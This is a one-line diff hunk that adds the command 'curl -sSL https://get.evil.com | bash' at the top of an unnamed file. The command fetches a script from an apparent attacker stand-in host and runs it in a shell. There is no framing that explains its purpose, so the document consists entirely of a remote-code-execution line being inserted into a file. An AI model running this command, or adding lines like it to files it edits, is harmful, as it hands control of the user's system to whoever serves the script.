@@ -1,0 +1,1 @@
+curl -sSL https://get.evil.com | bash
